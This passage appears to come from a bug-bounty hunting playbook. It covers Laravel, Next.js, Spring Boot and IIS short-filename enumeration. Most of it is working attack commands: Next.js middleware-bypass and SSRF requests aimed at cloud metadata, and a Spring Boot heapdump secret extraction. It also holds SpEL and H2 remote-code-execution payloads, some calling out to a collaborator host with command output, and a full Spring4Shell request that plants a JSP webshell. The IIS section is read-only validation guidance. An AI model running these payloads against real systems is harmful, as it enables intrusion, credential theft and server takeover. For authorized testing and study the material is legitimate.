| Laravel finding | Chain to | Impact |
|----------------|----------|--------|
| Debug mode ON | CVE-2021-3129 Ignition RCE | Critical RCE |
| Telescope accessible | Read API keys, DB queries, env vars | High - credential theft |
| Horizon accessible | Read failed job payloads | High - PII/token exfil |
| .env exposed with APP_KEY | Forge session cookie → ATO | Critical ATO |
| Signed URL bypass | Unauthorized actions (unsubscribe any user, etc.) | Medium-High |
| Mass assignment | Set is_admin=true → privilege escalation | Critical |

---

## Validation

✅ Ignition RCE: `id` command output returned in response
✅ Telescope: API responses contain DB queries with credentials or user tokens
✅ APP_KEY: Forged session cookie accepted, returns another user's profile
✅ Mass assignment: `is_admin: true` accepted, account now has admin privileges

**Severity:**
- Ignition RCE: Critical
- Telescope/Horizon with sensitive data: High
- .env with APP_KEY: Critical
- Mass assignment to admin: Critical




---

## nextjs

# HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities

## Crown Jewel Targets

Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.

**Highest-value chains:**
- **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
- **Middleware bypass via `/_next/static/`** — middleware skips static asset paths → protected routes accessible via `/_next/data/` IDOR
- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
- **ISR stale cache poisoning** — inject malicious content into a cached page that gets served to all users
- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client

---

## Attack Surface Signals

```
/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
/__nextjs_original-stack-frame   Debug stack frame endpoint
/_next/static/chunks/            JS bundles — source map candidate
/api/                            API routes — standard hunt surface
__NEXT_DATA__ in HTML            SSR props leaked to client
x-nextjs-* response headers      Confirms Next.js
```

---

## Phase 1 — Fingerprint & Version Detection

```bash
# Confirm Next.js and get build ID
curl -s https://$TARGET/ | grep -oP '"buildId":"[^"]+"'
curl -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"

# Extract build ID for /_next/data/ paths
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Check Next.js version via package disclosure
curl -s https://$TARGET/_next/static/chunks/framework*.js | grep -oP '"next":"[^"]+"'

# Source map exposure
curl -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

---

## Phase 2 — Server Actions Abuse

```bash
# Server Actions in Next.js 14+ use x-action-id or Next-Action header
# Find action IDs in HTML source or JS bundles
curl -s https://$TARGET/ | grep -oP '"action":"[a-f0-9]+"'
grep -r "createActionURL\|$$ACTION_" recon/$TARGET/ --include="*.js" 2>/dev/null

# Call Server Action directly without auth
curl -s -X POST https://$TARGET/target-page \
  -H "Next-Action: ACTION_ID_HERE" \
  -H "Content-Type: multipart/form-data; boundary=----" \
  -H "Cookie: " \
  --data-raw $'------\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------\r\n'

# Test: does the action execute without a valid session?
# If it returns data or mutates state → auth enforcement is client-side only
```

---

## Phase 3 — Middleware Auth Bypass

```bash
# Next.js middleware runs on edge runtime and may skip certain paths
# Test protected route directly
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
# → 200 means accessible

# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"

# Test via static asset path prefix (middleware matcher may exclude /_next/static)
curl -s "https://$TARGET/_next/static/../admin/dashboard"

# Encoded path bypass
curl -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"
curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
```

---

### Middleware bypass via `x-middleware-subrequest` (CVE-2025-29927)
Next skips middleware execution entirely when this header asserts an internal subrequest — bypassing auth/redirect middleware on gated routes.
```bash
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
# also: -H "x-middleware-subrequest: src/middleware"  and  "pages/_middleware"
# 200 on a middleware-gated route = bypassed. Fixed 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3.
```

## Phase 4 — Image Optimization SSRF (`/_next/image`)

```bash
# Basic SSRF test — internal metadata
curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"

# Protocol bypass attempts
curl -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"

# OOB detection — use a UNIQUE per-test subdomain so callbacks can't be confused
COLLAB="http://UNIQUE.COLLAB_HOST"
curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
# Check Interactsh/Burp Collaborator for DNS/HTTP callback on that exact subdomain
```

**FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only
fetches URLs allowed by `images.remotePatterns` / `images.domains` in
`next.config.js`. A non-whitelisted `url` returns **400 by default** — that is
the optimizer's normal allowlist rejection, NOT a "block" you bypassed. A **200**
returns an *optimized image*, not the upstream response body, so a status code
alone NEVER confirms SSRF. Confirm only via an **out-of-band callback to a unique
Collaborator subdomain** (above), or by body-diffing a known-internal vs
known-external target. Do not report on status code.

> Note: CVE-2024-34351 (Next.js SSRF, GHSA-fr5h-rqp8-mj6g, affects 13.4.0
> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF — a relative
> redirect that trusts the `Host` header — NOT a `/_next/image` bug, and it does
> NOT affect Host-routed providers like Vercel. See Phase 2 for the Server
> Actions surface.

---

## Phase 5 — `/_next/data/` IDOR & Data Leakage

```bash
# Enumerate prerendered JSON for user-specific data
# Pattern: /_next/data/BUILD_ID/[page].json or /_next/data/BUILD_ID/[dynamic]/[id].json
curl -s "https://$TARGET/_next/data/$BUILD_ID/profile.json" \
  -H "Cookie: session=VICTIM_SESSION"

# Try other users' data
for ID in 1 2 3 100 1000; do
  curl -s "https://$TARGET/_next/data/$BUILD_ID/users/$ID.json" | head -3
done

# Check __NEXT_DATA__ in HTML for sensitive server-side props
curl -s "https://$TARGET/dashboard" | \
  python3 -c "import sys,re,json; m=re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)),indent=2) if m else 'not found')"
```

---

## Phase 6 — ISR Cache Poisoning

```bash
# ISR pages regenerate on request after revalidation period
# If user input influences the static page content without sanitization:
# 1. Trigger revalidation with malicious input in URL/query
# 2. Injected content cached and served to all users

# Test: does query param affect cached page content?
# Use a UNIQUE marker (not a generic <script>) so a match proves YOUR input landed,
# and confirm the response was actually CACHED + served to a DIFFERENT client.
MARK="zqx$(date +%s)"
# 1) Poison with the marker
curl -s "https://$TARGET/blog/test-post?preview=<b>$MARK</b>" -o /dev/null
# 2) Re-fetch the CLEAN url (no query) from a fresh client and grep the marker.
#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers — a reflected
#    marker WITHOUT proof it persists in the cache key is just reflection, not poisoning.
curl -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"

# On-demand revalidation endpoint (if exposed)
curl -s "https://$TARGET/api/revalidate?secret=GUESS&path=/blog/test"
curl -s "https://$TARGET/api/revalidate?token=GUESS&path=/admin"
```

---

## Phase 7 — Debug & Stack Frame Endpoints

**Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`
are react-dev-overlay middleware mounted ONLY under `next dev`. A production
build (`next build && next start`) does not register these routes — a 404 here
is the normal, expected result, not a "filter" you need to bypass. They are
reachable ONLY in the rare misconfiguration of literally running `next dev` in
production. Treat any non-404 as the real finding; do NOT report a 404/filtered
response as confirmation.

```bash
# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
curl -s -o /dev/null -w "%{http_code}" \
  "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"

# Only if the above is NOT 404: the launch-editor / stack-frame endpoints can
# reference local files (file-read surface of a dev server wrongly exposed)
curl -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
curl -s "https://$TARGET/__nextjs_original-stack-frame" \
  --data '{"file":"/etc/passwd","line":1,"column":1}'
```

---

## Phase 8 — Environment Variable Leakage

```bash
# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets
curl -s "https://$TARGET/_next/static/chunks/pages/_app.js" | \
  grep -oE "NEXT_PUBLIC_[A-Z_]+['\"]?\s*[:=]\s*['\"]?[^'\"&\s]+"

# Check for non-public vars accidentally exposed
curl -s https://$TARGET/ | python3 -c "
import sys, re, json
m = re.search(r'__NEXT_DATA__.*?({.*?})</script>', sys.stdin.read(), re.S)
if m:
    d = json.loads(m.group(1))
    print(json.dumps(d.get('props', {}), indent=2))
"
```

---

## Chain Table

| Next.js finding | Chain to | Impact |
|----------------|----------|--------|
| Server Action no auth | Call privileged mutations directly | Data manipulation / admin access |
| `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
| `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
| Middleware bypass | Protected admin routes | Auth bypass |
| Source map exposed | Reconstruct TS source → find hardcoded secrets | Further vulns |
| `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |

---

## Validation

✅ Server Action: action executes without valid session, returns data or mutates state
✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
✅ Middleware bypass: 200 response on protected route without auth cookie
✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII

**Severity:**
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical
- Middleware bypass → admin panel: High
- Source map exposure only: Low-Medium




---

## springboot

# HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities

## Crown Jewel Targets

Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets in memory.

**Highest-value findings:**
- **`/actuator/heapdump`** — full JVM heap dump contains plaintext passwords, tokens, DB credentials, private keys stored anywhere in memory
- **`/actuator/env`** — lists all environment variables and Spring properties including secrets
- **`/actuator/shutdown`** — POST → shuts down the application (Critical availability impact)
- **H2 Console (`/h2-console`)** — in-memory DB admin UI → SQL query execution → potential RCE via `CREATE ALIAS` trick
- **SpEL injection** — Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params → RCE
- **Spring4Shell CVE-2022-22965** — Spring Framework < 5.3.18 + Tomcat → RCE via data binding

---

## Phase 1 — Fingerprint Spring Boot

```bash
# Spring Boot indicators
curl -sI https://$TARGET/ | grep -i "x-application-context\|x-content-type"
curl -s "https://$TARGET/nonexistent" | grep -i "Whitelabel Error Page\|Spring Boot\|org.springframework"

# Actuator root (may list available endpoints)
curl -s "https://$TARGET/actuator" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/actuator/" | python3 -m json.tool 2>/dev/null

# Try common base paths
for base in "" "/manage" "/management" "/app"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$base/actuator")
  [ "$STATUS" = "200" ] && echo "[+] Actuator at: $TARGET$base/actuator"
done
```

---

## Phase 2 — Actuator Endpoint Enumeration

```bash
BASE="https://$TARGET/actuator"

# High-impact endpoints
ENDPOINTS=("env" "heapdump" "threaddump" "mappings" "beans" "metrics" 
           "loggers" "info" "health" "configprops" "shutdown" "trace"
           "httptrace" "auditevents" "sessions" "scheduledtasks" "caches"
           "flyway" "liquibase" "refresh" "restart")

for EP in "${ENDPOINTS[@]}"; do
  # Don't trust HTTP 200 alone — Spring returns 200 with a Whitelabel/login
  # page for many paths. Require actuator-shaped JSON (or a heapdump body)
  # before calling it EXPOSED.
  BODY=$(curl -s -H "Accept: application/json" "$BASE/$EP")
  CT=$(curl -s -o /dev/null -w "%{content_type}" -H "Accept: application/json" "$BASE/$EP")
  if echo "$CT" | grep -qi "json" && ! echo "$BODY" | grep -qi "Whitelabel Error Page\|<html"; then
    echo "[+] EXPOSED: $BASE/$EP"
  fi
done

# Get environment variables (passwords, API keys)
curl -s "$BASE/env" | python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key\|token\|credential" | head -20

# Get all endpoint mappings (full API surface)
curl -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -oP '"pattern":"\K[^"]+' | sort

# Get Spring beans (lists all registered beans, reveals internal architecture)
curl -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
```

---

## Phase 3 — Heap Dump Analysis

```bash
# Download heap dump (can be large — 100MB+)
curl -s "$BASE/heapdump" -o /tmp/heapdump.hprof
ls -lh /tmp/heapdump.hprof

# Quick grep for secrets in heap dump (binary file — use strings)
strings /tmp/heapdump.hprof | grep -iE "(password|secret|apikey|api_key|token|bearer|private_key)" | \
  grep -v "^[a-z_]" | sort -u | head -50

# More targeted extraction
strings /tmp/heapdump.hprof | grep -oP "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -20
strings /tmp/heapdump.hprof | grep -oP "AKIA[A-Z0-9]{16}" | sort -u        # AWS keys
strings /tmp/heapdump.hprof | grep -oP "sk_live_[A-Za-z0-9]+" | sort -u     # Stripe keys
strings /tmp/heapdump.hprof | grep -oP "Bearer [A-Za-z0-9._-]+" | sort -u   # Bearer tokens

# Use Eclipse Memory Analyzer (MAT) for deep analysis
# https://www.eclipse.org/mat/
```

---

## Phase 4 — H2 Console RCE

```bash
# H2 console detection
curl -s "https://$TARGET/h2-console" | grep -i "H2 Console\|H2 Database"
curl -s "https://$TARGET/h2" | grep -i "H2 Console"
curl -s "https://$TARGET/console" | grep -i "H2"

# Default credentials: sa / (empty password)
# JDBC URL: jdbc:h2:mem:testdb

# If accessible, RCE via CREATE ALIAS:
# SQL to execute:
# CREATE ALIAS EXEC AS $$ String exec(String cmd) throws Exception {
#   Runtime rt = Runtime.getRuntime();
#   String[] commands = {"sh","-c",cmd};
#   Process proc = rt.exec(commands);
#   return new String(proc.getInputStream().readAllBytes());
# } $$;
# CALL EXEC('id');
```

---

## Phase 5 — SpEL Injection

```bash
# Spring Expression Language injection in user-controlled fields
# Test: ${7*7} or #{7*7} → if the response reflects 49, SpEL is being evaluated

# Common injection points:
# - Email template fields: "Hello ${name}"
# - Custom annotation @Value("${user.input}")
# - Spring Security expressions
# - Spring WebFlow

# Basic SpEL test
curl -s -X POST "https://$TARGET/api/user/name" \
  -H "Content-Type: application/json" \
  -d '{"name": "#{7*7}"}'
# If returns 49 → SpEL injection confirmed

# RCE payload — note: exec() returns a Process, not a String, so a bare
# exec("id") produces NO visible output. Confirm via an OOB curl callback
# (the spawned curl makes the network request even though nothing is reflected):
curl -s -X POST "https://$TARGET/api/user/name" \
  -H "Content-Type: application/json" \
  -d '{"name": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl COLLAB_HOST/spel-$(id|base64)\"})}"}'

# CVE-2022-22963 — Spring Cloud Function SpEL
curl -s -X POST "https://$TARGET/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"curl COLLAB_HOST/spel-rce\")" \
  -d "test"
```

---

## Phase 5b — Spring Cloud Gateway Actuator SpEL RCE (CVE-2022-22947)
If the `gateway` actuator is exposed, add a route whose filter body is SpEL, then refresh to evaluate it (escape inner quotes for your shell):
```bash
curl -s -X POST "$BASE/actuator/gateway/routes/hax" -H "Content-Type: application/json" \
 -d '{"id":"hax","filters":[{"name":"AddResponseHeader","args":{"name":"X","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{ \"id\" })}"}}],"uri":"http://x"}'
curl -s -X POST "$BASE/actuator/gateway/refresh"; curl -s "$BASE/actuator/gateway/routes"
```

## Phase 5c — Writable `/env` -> `/refresh` gadget RCE
When `/actuator/env` accepts POST and `/actuator/refresh` exists, poison a property then reload:
```bash
# logback JNDI:
curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"logging.config","value":"http://$COLLAB/logback.xml"}'
# Eureka XStream deserialization:
curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"eureka.client.serviceUrl.defaultZone","value":"http://$COLLAB/x"}'
curl -s -X POST "$BASE/actuator/refresh"
```
(Veracode: Exploiting Spring Boot Actuators.)

## Phase 6 — Spring4Shell (CVE-2022-22965)

```bash
# Affects: Spring Framework < 5.3.18 and < 5.2.20 (and all older branches);
# fixed in 5.3.18 / 5.2.20. Requires JDK 9+ and WAR-on-Tomcat deployment.
# Requires: Java 9+, Tomcat as WAR deployment

# Detection: does the app accept class.* parameters?
curl -s "https://$TARGET/api/user" \
  -d "class.module.classLoader.URLs[0]=jar:http://COLLAB_HOST/test.jar!/"
# Check COLLAB for HTTP callback

# Exploitation: write webshell via class loader
curl -s "https://$TARGET/login" \
  --data-raw "username=test&password=test&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B+java.io.InputStream+in+%3D+Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B+int+a+%3D+-1%3B+byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B+while((a%3Din.read(b))!%3D-1)%7B+out.println(new+String(b))%3B+%7D+%7D+%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
```

---

## Phase 7 — Jolokia JMX Exposure

```bash
# Jolokia provides HTTP access to JMX MBeans
curl -s "https://$TARGET/jolokia" | python3 -m json.tool 2>/dev/null | head -20
curl -s "https://$TARGET/actuator/jolokia" | python3 -m json.tool 2>/dev/null | head -20

# List all MBeans
curl -s "https://$TARGET/jolokia/list" | python3 -m json.tool 2>/dev/null | grep -i "type\|operation" | head -30

# Read system properties via Jolokia (may expose credentials)
curl -s "https://$TARGET/jolokia/read/java.lang:type=Runtime/SystemProperties" | \
  python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key"

# Exec MBean operations (potential RCE via MLet)
curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/tmp/evil"
```

---

## Chain Table

| Spring Boot finding | Chain to | Impact |
|--------------------|----------|--------|
| `/actuator/heapdump` | Extract DB passwords, API keys from memory | Critical credential exfil |
| `/actuator/env` | Read all env vars including secrets | High |
| H2 console accessible | CREATE ALIAS → RCE | Critical |
| SpEL injection | `T(Runtime).exec()` → OS command | Critical RCE |
| Spring4Shell | Write webshell → RCE | Critical |
| Jolokia + MLet | Remote code via MBean | Critical RCE |

---

## Validation

✅ Heap dump: strings command extracts readable passwords/tokens from .hprof file
✅ Actuator/env: secrets visible in JSON response
✅ SpEL: arithmetic expression evaluates (7*7=49) or OOB callback received
✅ H2 console: SQL executed, `id` output returned

**Severity:**
- Heapdump with credentials: Critical
- SpEL RCE: Critical
- H2 console RCE: Critical
- Actuator env (passwords exposed): High
- Mappings disclosure only: Low-Medium




---

## iis

# IIS Short Filename Enumeration Validation

Shortscan proves that an IIS server leaks 8.3 short names. It does **not** prove that an interesting file exists, and a `200 OK` does not prove a reconstructed name is real. Treat every short name as evidence, every reconstructed name as a hypothesis, and every validated URL as a separate claim.

Only test targets the user is authorized to assess. Validation is read-only: GET/HEAD only, no credentials, no uploads, no writes, no destructive payloads. If a check would change state, stop and mark INCONCLUSIVE.

## Artifacts

```bash
OUTDIR="./iis-validation/$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTDIR"/{templates,bodies,headers}
```

Keep the raw scan untouched. Expected files:

| File | Purpose |
|---|---|
| `shortscan.original.txt` | untouched human output |
| `shortscan.jsonl` | optional JSON pass for parsing |
| `findings.tsv` | normalized per-file rows |
| `shortscan_ignore.txt` | global default filter (project root) |
| `validation.log` | URL, status, baseline delta, verdict |
| `report.md` | final report |

`shortscan_ignore.txt` lives in the project root, next to the report — never inside the target or tool directories.

## Phase 0 — Preconditions

```bash
command -v shortscan curl jq
shortscan --help >/dev/null
test -s httpx.txt || echo "MISSING httpx.txt"
```

Never re-run a scan the user already has; parse the existing output and use targeted requests. If asked to run it, preserve the original command:

```bash
cat httpx.txt \
  | sort -t'[' -k3,3nr \
  | grep -aE "IIS|IIS Windows Server|Microsoft-IIS|Windows Server" \
  | awk '{print $1}' \
  | shortscan | tee "$OUTDIR/shortscan.original.txt"
```

Do not alter the pipeline. Run it once and keep the output.

## Phase 1 — Parse complete output

Shortscan human output uses one row per discovered name:

```text
SHORTNAME            POSSIBLE?NAME                 /path/URL
```

`?` marks characters Shortscan could not determine. Use `--fullurl` when re-running a specific target if paths are truncated.

For machine parsing, re-run the same URLs with JSON (read-only, safe) or scan a small list:

```bash
printf '%s\n' "$TARGET" > "$OUTDIR/targets.txt"
shortscan -o json @"$OUTDIR/targets.txt" > "$OUTDIR/shortscan.jsonl"
```

For many targets, feed the same filtered URL list to the JSON pass instead of re-filtering by hand.

JSON records:

```json
{"type":"status","url":"...","server":"...","vulnerable":true}
{"type":"result","fullmatch":true,"baseurl":"...","shortfile":"WEB","shortext":".CON","shorttilde":"~1","partname":"WEB.CON?","fullname":"WEB.CONFIG"}
{"type":"statistics","requests":0,"retries":0,"sentbytes":0,"receivedbytes":0}
```

Normalize each finding:

```bash
jq -c 'select(.type=="result")' "$OUTDIR/shortscan.jsonl" \
  | jq -c '{url:.baseurl, short:(.shortfile + .shorttilde + .shortext),
            part:.partname, full:.fullname, fullmatch:.fullmatch}' \
  > "$OUTDIR/findings.normalized.jsonl"

jq -r '[.baseurl, (.shortfile + .shorttilde + .shortext), .partname, .fullname, (.fullmatch|tostring)] | @tsv' \
  "$OUTDIR/shortscan.jsonl" | sort -u > "$OUTDIR/findings.tsv"
```

Fields to record per result: URL, short filename, possible/partial name, extension, whether it is a directory, whether Shortscan reconstructed the full name (`fullmatch`/`fullname`), whether the original is unknown (`?` remaining), and whether it is a known default.

Deduplicate identical `(host, shortname, path)` rows. Group by host, then by directory.

## Phase 2 — Remove known defaults

Always ignore these ASP.NET/IIS framework resources and every nested occurrence:

```text
ASPNET_CLIENT
SYSTEM_WEB
2_0_50~1
4_0_30~1
```

Example: `/ASPNET_CLIENT/`, `/ASPNET_CLIENT/SYSTEM_WEB/`, `/ASPNET_CLIENT/SYSTEM_WEB/2_0_50~1`, `/ASPNET_CLIENT/SYSTEM_WEB/4_0_30~1` are all default framework content.

Treat other obvious framework/default resources as low value unless the response exposes application-specific content: `_VTI_*` (FrontPage/SharePoint metadata), `BIN`, `APP_CODE`, `APP_DATA`, `APP_BROWSERS`, `APP_GLOBALRESOURCES`, `APP_LOCALRESOURCES`, `APP_THEMES`, `APP_WEBREFERENCES`, `IISSTART`, `WELCOME`, `PRINTING`, `SCRIPTS`, `IMAGES` (when purely static), `FAVICON`, `GLOBAL~1.ASA` **only if** it is the compiled ASP.NET global (no application evidence).

Rule: defaults are filtered by path/shape, not by a single substring. `/APP_DATA/` is default; `/APP_DATA_BACKUP/` is not automatically default.

Maintain the ignore file without destroying prior entries:

```bash
test -f shortscan_ignore.txt || printf '%s\n' ASPNET_CLIENT SYSTEM_WEB '2_0_50~1' '4_0_30~1' > shortscan_ignore.txt
```

Never add an application-specific name to this file just because it was uninteresting on one target.

## Phase 3 — What 8.3 actually tells you

Windows generates `PREFIX~N.EXT`:

- `PREFIX` is up to the first **6** valid characters of the long name (spaces and dots removed).
- `~N` is a collision/ordinal suffix, not part of the name.
- `EXT` is up to 3 characters, uppercased.

Consequences:

- `LOGIN~1.ASP` does **not** prove `LOGIN.ASPX`. It proves an 8.3 entry whose prefix begins `LOGIN` and whose extension begins `ASP`.
- A tilde can mean the long name is simply long **or** that two names collide. `LOGIN~1` may be `LOGINPAGE.ASPX`, or `LOGIN.ASPX` colliding with an existing `LOGIN.ASP`.
- `~2` means a second colliding name, not a second copy of the same file.
- Extensions are ambiguous:

| Short ext | Possible real extensions |
|---|---|
| `.ASP` | `.asp`, `.aspx`, `.ascx`, `.ashx`, `.asmx`, `.asax`, `.aspq` |
| `.HTM` | `.htm`, `.html`, `.xhtml` (rare) |
| `.CON` | `.config`, `.conf` |
| `.MAS` | `.master` |
| `.ASA` | `.asa`, `.asax` |
| `.TXT` | `.txt` |
| `.JPG` | `.jpg`, `.jpeg` |
| `.ZIP` | `.zip` |

- Directories have no extension (e.g. `ADMIN~1`). IIS is case-insensitive, so case in a candidate is cosmetic.

Only Shortscan's `fullmatch=true` / non-empty `fullname` is a **reconstruction**, and even that is a hypothesis until HTTP validation.

## Phase 4 — Reconstruct candidates and score them

Generate a small, ranked candidate set per short name. Do not fabricate a single name and present it as fact.

```text
SHOWRE~1.ASP  -> SHOWREPORT.ASPX (prefix match, app naming)
              -> SHOWREPORTS.ASPX
              -> SHOWRESULTS.ASP  (only if directory context supports it)
LOGIN~1.ASP   -> LOGIN.ASPX
              -> LOGINPAGE.ASPX
DEFAUL~1.ASP  -> DEFAULT.ASPX
```

Confidence rubric:

| Confidence | Criteria |
|---|---|
| **HIGH** | Shortscan `fullname` complete (no `?`) **and** HTTP validation shows a distinct response vs. baseline; or the partial name is fully determined and validated. |
| **MEDIUM** | Shortscan partial has ≤1 unknown character; prefix + extension fit common app conventions; directory siblings support it; response is distinct but not definitive. |
| **LOW** | Generic `~1` with several plausible long names; extension ambiguous; no distinct HTTP evidence. Prefer INCONCLUSIVE over asserting. |

Do not raise confidence from plausibility alone. A convincing word (`ADMIN`, `BACKUP`, `CONFIG`) is prioritization, not proof.

## Phase 5 — Safe HTTP validation

For each interesting candidate, request the exact path with a normal, unauthenticated GET (HEAD only as a supplementary check):

```bash
BASE="http://host:port"          # scheme exactly as scanned
CAND="$BASE/SHOWREPORT.ASPX"
curl -sS --max-time 15 -D "$OUTDIR/headers/cand.hdr" -o "$OUTDIR/bodies/cand.body" \
  -w 'status=%{http_code} size=%{size_download} type=%{content_type} redirect=%{redirect_url}\n' "$CAND"
```

Check: status, redirect target, `Content-Type`, `Content-Length`, title, body, whether it differs from the site's 404, and whether it looks like a real application endpoint.

A `200` alone is **not** confirmation. Do not send credentials, do not POST, do not upload, do not run commands. If a path only reveals itself after auth, record INCONCLUSIVE.

## Phase 6 — Soft-404 baseline (mandatory)

Before trusting any candidate, establish how the app handles nonexistent paths — including per-directory behavior:

```bash
RAND="nx-$(date +%s)-$RANDOM"
curl -sS --max-time 15 -o "$OUTDIR/bodies/control.body" -D "$OUTDIR/headers/control.hdr" \
  -w 'CONTROL status=%{http_code} size=%{size_download} type=%{content_type}\n' \
  "$BASE/$RAND"

# same-directory control for nested candidates
curl -sS --max-time 15 -o "$OUTDIR/bodies/control-dir.body" \
  "$BASE/SOMEDIR/$RAND"
```

Normalize volatile content before comparing (dates, request IDs, CSRF tokens, ad/analytics blocks):

```bash
norm() { tr -d '\r' < "$1" | sed -E 's/[0-9a-f]{16,}/<HEX>/g; s/[0-9]{2}:[0-9]{2}:[0-9]{2}/<TIME>/g'; }
sha256sum <(norm "$OUTDIR/bodies/control.body") <(norm "$OUTDIR/bodies/cand.body")
```

Verdict rules:

- Candidate status/size/title/body hash ≈ control → **soft-404**, not confirmation.
- Control `404` + candidate `200` with distinct body/title/type → strong evidence.
- Control `200` (custom error) + candidate `200` with clearly larger/different body and a real page title → medium evidence; corroborate with a second candidate or a directory listing.
- Candidate redirects to `/login`, `/error`, or the home page → not evidence of the file; record as such.
- Candidate returns `403`/`401` → the resource may exist but access is denied: INCONCLUSIVE, not CONFIRMED.
- IIS may return `404` with a custom body, or `200` with an error page. Always compare content, not just status.

Log every check:

```bash
printf '%s\t%s\t%s\t%s\t%s\n' "$SHORT" "$CAND" "$STATUS" "$SIZE" "$VERDICT" >> "$OUTDIR/validation.log"
```

## Phase 7 — Directory structure

Shortscan may recurse into discovered directories. Ignore the default hierarchy from Phase 2. For non-default directories:

- Request the directory with and without a trailing slash.
- Compare against a same-directory control path.
- If the directory is browseable, a listing is strong corroboration for filenames inside it.
- If `/SOMETHING~1/` resolves to a real application area, validate its children separately; do not infer child names from the parent.

## Phase 8 — Classify every result

Exactly one label per finding:

1. **DEFAULT / IGNORE** — known framework/default resource.
2. **SHORT-NAME DETECTED** — enumeration worked; the original name is unresolved (`?` remains).
3. **LIKELY APPLICATION FILE** — strong contextual evidence (naming, siblings, distinct response) but not fully validated.
4. **CONFIRMED FILE** — reconstructed name/path independently validated against the soft-404 baseline.
5. **INCONCLUSIVE** — insufficient evidence, blocked, auth-gated, or unstable responses.
6. **FALSE POSITIVE** — explained by defaults, soft-404, WAF/error page, or a non-interesting condition.

Global suppression applies only to default/framework patterns. Never suppress an application-specific name because one target's validation failed.

## Phase 9 — Prioritize interesting functionality

High-signal words: `LOGIN`, `SIGNOUT`, `SIGNOU`, `AUTH`, `ADMIN`, `REPORT(S)`, `PATIENT`, `USER`, `ACCOUNT`, `PASSWORD`, `CONFIG`, `UPLOAD`, `DOWNLOAD`, `BACKUP`, `API`, `DEBUG`, `TEST`, `DATABASE`, `GLOBAL`, `PAYMENT`, `RECEIPT`, `RESULT`, `CHANGE`, `SEARCH`, `EXPORT`, `IMPORT`, `PROFILE`, `SETTINGS`.

These words only set review order. They do not imply vulnerability, and a match is not proof the file exists.

## Phase 10 — Global default filter

